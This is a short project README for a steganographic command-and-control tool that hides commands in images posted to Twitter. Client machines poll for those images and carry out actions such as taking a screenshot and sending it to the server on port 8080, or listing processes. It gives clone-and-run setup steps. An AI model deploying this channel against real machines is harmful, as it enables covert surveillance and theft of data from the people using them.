## Usage
Manually create twitter account.
Create `config.py` (see `config_sample.py` for details) and enter your twitter id.
Manually upload the generated `output.png` in your twitter account.
Once you fix `cron.conf` for your environment, run the following commands.

The prepared `payload.txt` takes a screenshot of the client, and then sends it to port 8080 of the server.
Syntax is as follows:
```
<Server IP Address>:<Server Port>/<Action>
```
Available actions are: `screenshot` and `processes`.

### Server
```bash
git clone https://github.com/leojojo/twitter_cc_steg.git
cd twitter_cc_steg
pip -r requirements.txt
python steg.py -c server/carrier.png -p payload.txt
chmod +x ./server/server.sh
./server/server.sh
```
Manually upload the generated `output.png` on twitter.

![embedded text](https://blog.leojojo.me/images/Steganography-Memes-for-Christmas/2.png)

### Client
```bash
git clone https://github.com/leojojo/twitter_cc_steg.git
cd twitter_cc_steg
pip -r requirements.txt
cp client/config_sample.py client/config.py
python client/check_twitter.py
```
Input your twitter ID in `config.py`.
You can also run the `check_twitter.py` regularly via `crontab cron.conf`.

The script should find and download images uploaded to twitter, and attempt to extract a string from one of them.

## 説明
https://blog.leojojo.me/2018/12/29/Steganography-Memes-for-Christmas/
